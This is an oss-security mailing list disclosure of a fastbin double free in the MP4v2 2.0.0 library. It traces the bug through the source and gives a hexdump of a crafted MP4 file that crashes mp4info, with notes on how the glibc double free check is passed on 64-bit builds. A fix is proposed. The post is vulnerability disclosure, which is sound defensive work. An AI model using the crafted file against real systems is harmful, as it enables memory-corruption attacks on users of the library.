@@ -1,0 +1,136 @@
+
+Date: Fri, 13 Jul 2018 14:09:48 +0800
+From: Ruikai Liu <lrk700@...il.com>
+To: oss-security@...ts.openwall.com
+Subject: Fastbin double free in MP4v2 2.0.0
+
+Hi,
+
+There's a double free issue in MP4v2 2.0.0, a legacy library dealing with
+MP4 media file.
+
+========= Details =========
+
+The buffer is first allocated during the construction of a
+`MP4Mp4vAtom::MP4Mp4vAtom` in src/atom_mp4v.cpp:
+
+ 46     MP4StringProperty* pProp =
+ 47         new MP4StringProperty(*this, "compressorName");
+ 48     pProp->SetFixedLength(32);
+ 49     pProp->SetCountedFormat(true);
+ 50     pProp->SetValue("");
+ 51     AddProperty(pProp); /* 6 */
+
+In which `SetValue` would allocate a buffer of 32 bytes for the default
+value(src/mp4property.cpp):
+
+ 534         if (m_values[index] == NULL) {
+ 535             m_values[index] = (uint8_t*)MP4Calloc(m_fixedValueSize);
+ 536             m_valueSizes[index] = m_fixedValueSize;
+ 537         }
+
+Later, when parsing the atom, a try-catch block is used(src/mp4atom.cpp):
+
+ 194     try {
+ 195         pAtom->Read();
+ 196     }
+ 197     catch (Exception* x) {
+ 198         // delete atom and rethrow so we don't leak memory.
+ 199         delete pAtom;
+ 200         throw x;
+ 201     }
+
+And calling the atom's `Read()` would then invoke reading its
+`MP4StringProperty` too, in which case the buffer allocated above would be
+freed and re-allocaed for the actual value(src/mp4property.cpp):
+
+ 390     for( uint32_t i = begin; i < max; i++ ) {
+ 391         char*& value = m_values[i];
+ 392
+ 393         // Generally a default atom setting, e.g. see atom_avc1.cpp,
+"JVT/AVC Coding"; we'll leak this string if
+ 394         // we don't free.  Note that MP4Free checks for null.
+ 395         MP4Free(value);
+ 396
+ 397         if( m_useCountedFormat ) {
+ 398             value = file.ReadCountedString( (m_useUnicode ? 2 : 1),
+m_useExpandedCount, m_fixedLength );
+ 399         }
+
+However, a crafted file could result in an exception in
+`ReadCountedString`(src/mp4file_io.cpp):
+
+ 93     if( file->read( buf, bufsiz, nin ))
+ 94         throw new PlatformException( "read failed",
+sys::getLastError(), __FILE__, __LINE__, __FUNCTION__ );
+ 95     if( nin != bufsiz )
+ 96         throw new Exception( "not enough bytes, reached end-of-file",
+__FILE__, __LINE__, __FUNCTION__ );
+
+So the exception handler would invoke the deconstructor of `pAtom`, which
+would delete its properties and free the dangling pointer for the second
+time.
+
+========= POC =========
+
+Here's a POC file:
+
+root@...ian:~# hexdump -Cv c1.mp4
+00000000  00 00 00 18 66 74 79 70  6d 70 34 32 01 2a 00 7e
+|....ftypmp42.*.~|
+00000010  6d 70 34 32 69 73 6f 6d  00 00 00 4a 6d 70 34 76
+|mp42isom...Jmp4v|
+00000020  6d 70 ff ff 00 01 33 a9  00 7f ff 63 00 05 00 65
+|mp....3....c...e|
+00000030  00 00 00 07 63 61 74 67  00 1b ff f0 64 78 74 40
+|....catg....dxt@|
+00000040  00 de ff 00 00 ff ff ff  ff 00 1a 00 0b 00 19 72
+|...............r|
+00000050  8b 00 00 00 10 23 11 64  61 74 60 00 00 00 ff 7f
+|.....#.dat`.....|
+00000060  ff ff                                             |..|
+00000062
+
+The `prev_inuse` flag is ignored for fastbin, and there are some other
+buffers freed during the double free. Some of them happened to be of the
+same size(32 bytes) and the double free check is passed for 64-bits MP4v2.
+Yet for 32-bits MP4v2 those buffers are of different size the program would
+abort.
+
+root@...ian:~/src/mp4v2-2.0.0-orig-x64# dpkg -s mp4v2-utils
+Package: mp4v2-utils
+Status: install ok installed
+Priority: optional
+Section: sound
+Installed-Size: 281
+Maintainer: Debian Multimedia Maintainers <
+pkg-multimedia-maintainers@...ts.alioth.debian.org>
+Architecture: i386
+Source: mp4v2 (2.0.0~dfsg0-5)
+Version: 2.0.0~dfsg0-5+b1
+Depends: libmp4v2-2 (= 2.0.0~dfsg0-5+b1), libc6 (>= 2.4), libgcc1 (>=
+1:4.2), libstdc++6 (>= 5.2)
+...
+
+root@...ian:~# mp4info c1.mp4
+mp4info version -r
+c1.mp4:
+*** Error in `mp4info': double free or corruption (fasttop): 0x56d883d0 ***
+...
+
+========= Fix =========
+
+One way to fix the bug is to clear the dangling pointer after the the first
+free.
+
+========= Reference =========
+
+https://code.google.com/archive/p/mp4v2/
+
+
+
+-- 
+Best regards,
+
+Ruikai Liu
+
